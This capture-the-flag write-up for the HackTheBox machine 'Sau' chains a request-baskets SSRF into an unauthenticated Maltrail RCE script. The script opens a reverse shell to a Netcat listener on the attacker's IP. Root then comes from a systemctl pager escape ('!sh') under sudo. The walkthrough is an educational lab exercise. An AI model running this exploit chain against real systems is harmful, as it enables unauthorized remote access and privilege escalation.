---
title: Sau
tags:
  - HackTheBox
  - Easy
  - Linux
  - Request-Baskets
  - Maltrail
  - CVE
  - Sudo-Vulnerability
date: 2025-02-03T00:00:00Z
---
![](Pasted%20image%2020250203221254.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.224 sau.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- sau.htb > sC.txt

[redacted]
PORT      STATE    SERVICE
22/tcp    open     ssh
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

So I decided to check what was inside port `55555`:

![](Pasted%20image%2020250203221622.png)

The page seems to be using request-baskets v1.2.1:

![](Pasted%20image%2020250203221654.png)

## Weaponization

>[!Info]
>*Request Baskets is a web service designed to collect and inspect arbitrary HTTP requests through a RESTful API or a simple web user interface*

I searched for "*request-baskets* 1.2.1 exploit" and found [CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163). 

## Exploitation

I'll create a new basket called `gitblanc`:

![](Pasted%20image%2020250203222706.png)

![](Pasted%20image%2020250203222720.png)

It gave me a token: `4clZ0l4ohziKAWm4BqKq7JuNoboz7eipYil54ruuiqxE`

Now I set up a Netcat listener:

```shell
nc -lvp 666
```

Now I'll click on the settings menu and test the connection:

![](Pasted%20image%2020250203223018.png)

I'll enter my ip:

![](Pasted%20image%2020250203223203.png)

> I received the request in my nc listener :D

![](Pasted%20image%2020250203223232.png)

Now I can try to check what is running inside port 80 by editing the proxy configuration:

![](Pasted%20image%2020250203223512.png)

Now I can browse it like `http://sau.htb:55555/gitblanc`:

![](Pasted%20image%2020250203223638.png)

## Weaponization

I searched for "*maltrail 0.53 exploit*" and got [Unauthenticated RCE](https://github.com/spookier/Maltrail-v0.53-Exploit)

## Exploitation

I executed the script:

```shell
python3 exploit.py 10.10.14.21 666 http://sau.htb:55555/gitblanc
```

> Got a shell :D

![](Pasted%20image%2020250203224053.png)

### User flag

![](Pasted%20image%2020250203224214.png)

## Privilege Escalation

If we run `sudo -l`:

```shell
sudo -l

[redacted]
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

I checked `systemctl` version with:

```shell
systemctl --version
```

Got v245. Therefore I checked for "*systemctl 245 exploit*" and got [CVE-2023–26604](https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7)

![](Pasted%20image%2020250203225041.png)

So I executed:

```shell
sudo -u root /usr/bin/systemctl status trail.service
# Then 
!sh
```

> Now I'm root :D

![](Pasted%20image%2020250203225230.png)

### Root flag

![](Pasted%20image%2020250203225301.png)

==Machine pwned!==